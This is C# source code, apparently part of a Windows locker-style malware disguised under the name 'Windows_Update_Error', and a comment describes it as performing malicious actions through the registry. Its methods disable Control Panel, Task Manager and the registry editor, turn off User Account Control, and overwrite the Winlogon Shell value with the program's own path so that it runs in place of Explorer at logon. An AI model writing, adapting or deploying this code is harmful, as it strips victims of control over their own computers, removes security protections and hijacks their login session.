using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Windows_Update_Error
{
    // This class contains methods for manipulating the Windows registry to perform malicious actions.
    internal class Regedit_Set
    {
        // Method to disable system settings related features.
        // It creates registry keys to disable the Control Panel and Task Manager.
        public void Disable_Settings()
        {
            // Open the registry key for the current user.
            RegistryKey key = Registry.CurrentUser;
            // Create or open the registry key for Explorer policies.
            RegistryKey software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
            // Set the value to disable the Control Panel.
            software.SetValue("NoControlPanel", 1);
            // Create or open the registry key for System policies.
            software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            // Set the value to disable the Task Manager.
            software.SetValue("DisableTaskMgr", 1);
            // Close the registry keys.
            software.Close();
            key.Close();
        }

        // Method to disable the registry editor.
        // It creates a registry value to prevent access to the registry editor.
        public void Disable_Regedit()
        {
            // Open the registry key for the current user.
            RegistryKey key = Registry.CurrentUser;
            // Open or create the registry key for System policies with write access.
            RegistryKey software = key.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
            // If the key does not exist, create it.
            if (software == null)
            {
                software = key.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            }
            // Set the value to disable the registry editor.
            software.SetValue("DisableRegistryTools", 1);
            // Close the registry keys.
            software.Close();
            key.Close();
        }

        // Method to write data to a file related to the program's startup.
        // It creates or overwrites a file with the provided data.
        public void Start_Update(string a)
        {
            try
            {
                // Create a StreamWriter to write to the file.
                StreamWriter writer = new StreamWriter("Error_m1.txt", false, Encoding.UTF8);
                // Write the data to the file.
                writer.Write(a);
                // Flush the writer to ensure the data is written to the file.
                writer.Flush();
                // Close the writer.
                writer.Close();
            }
            catch (Exception ex)
            {
                // Display an error message if an exception occurs.
                MessageBox.Show(ex.Message);
            }
        }

        // Method to read data from the file related to the program's startup.
        // It checks if the file exists and reads its content. If the file does not exist, it creates it with a default value.
        public string Start_Detection()
        {
            // The path to the file.
            string path = "Error_m1.txt";
            // Create a FileInfo object to check if the file exists.
            FileInfo fileInfo = new FileInfo(path);
            // If the file does not exist, create it with a default value.
            if (fileInfo.Exists == false)
            {
                try
                {
                    // Create a StreamWriter to write to the file.
                    StreamWriter writer = new StreamWriter(path, false, Encoding.UTF8);
                    // Write the default value to the file.
                    writer.Write("114514");
                    // Flush the writer to ensure the data is written to the file.
                    writer.Flush();
                    // Close the writer.
                    writer.Close();
                }
                catch (Exception ex)
                {
                    // Display an error message if an exception occurs.
                    MessageBox.Show(ex.Message);
                }
            }
            // Create a StreamReader to read from the file.
            StreamReader sr = new StreamReader(path, Encoding.UTF8);
            // Read the content of the file.
            string read = sr.ReadToEnd();
            // Close the StreamReader.
            sr.Close();
            // Return the read data.
            return read;
        }

        // Method to turn off User Account Control (UAC).
        // It modifies a registry value to disable UAC.
        public void UAC_OFF()
        {
            // Open the registry key for the local machine.
            RegistryKey key = Registry.LocalMachine;
            // Open or create the registry key for System policies with write access.
            RegistryKey software = key.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", true);
            // If the key does not exist, create it.
            if (software == null)
            {
                software = key.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
            }
            // Set the value to turn off UAC.
            software.SetValue("EnableLUA", 0);
            // Close the registry keys.
            software.Close();
            key.Close();
        }

        // Method to set the program to start automatically on system boot.
        // It modifies the registry key for the Winlogon process to set the program's path as the shell.
        public void PC_Start()
        {
            try
            {
                // Get the path of the current process.
                string local_1 = Process.GetCurrentProcess().MainModule.FileName;
                // Open the registry key for the Winlogon process.
                RegistryKey key = Registry.LocalMachine;
                RegistryKey software = key.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", true);
                // If the key does not exist, create it.
                if (software == null)
                {
                    software = key.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
                }
                // Set the shell value to the program's path.
                software.SetValue("Shell", local_1);
                // Close the registry keys.
                software.Close();
                key.Close();
            }
            catch (Exception ex)
            {
                // Display an error message if an exception occurs.
                MessageBox.Show(ex.Message);
            }
        }
    }
}